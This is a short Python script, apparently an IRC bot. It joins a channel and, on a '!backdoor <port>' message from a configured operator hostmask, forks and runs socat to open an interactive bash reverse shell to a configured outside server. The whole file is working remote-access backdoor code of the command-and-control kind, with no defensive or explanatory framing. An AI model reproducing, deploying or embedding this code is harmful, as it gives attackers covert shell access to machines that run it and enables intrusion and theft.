# -*- coding: utf-8 -*-

from rocksock import Rocksock, RocksockException
from irc import RsIRC

def backdoor(server, port):
	import os
	import shlex
	pid = os.fork()
	if pid == 0: #child
		#import pty
		#pty.spawn("/bin/bash")'
		cmd = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%d"%(server, port)
		#cmdarr = shlex.split(cmd)
		os.execlp('/bin/sh', '/bin/sh', '-c', cmd)


if __name__ == '__main__':
	import time
	from config import host, botnick, channel, opmask, backdoorserver

	irc = RsIRC(host=host, port=6697, timeout=180, ssl=True, nickname=botnick, username='blah')
	while True:
		s = irc.readline()
		try:
			a,b,c = s.split(' ', 2)
		except:
			a, b = s.split(' ')
			if a == 'PING':
				irc.sendl('PONG %s'%b)
			else:
				print "WEIRD COMMAND:" + s
				continue

		#print "B = ___" + b + "___"
		if b == "433": #name in use
			print "nick in use, appending _ ..."
			irc.nickname = irc.nickname + "_"
			irc.reconnect()
		elif b == '376': #MOTD finish
			irc.sendl('JOIN %s'%channel)
		elif b == "PRIVMSG":
			a,b,c,d = s.split(' ', 3)
			a = a.lstrip(':')
			try:
				nick, mask = a.split('!')
			except:
				irc.privmsg(channel, "OOPS " + a)
				nick = ""
				mask = ""
			if mask.startswith('~'): mask = mask[1:]
			if mask == opmask:
				d = d.lstrip(':')
				words = d.split(' ')
				if words[0] == '!backdoor':
					backdoor(backdoorserver, int(words[1]))
					try:
						pass
					except:
						pass

		if not s: continue
		print s
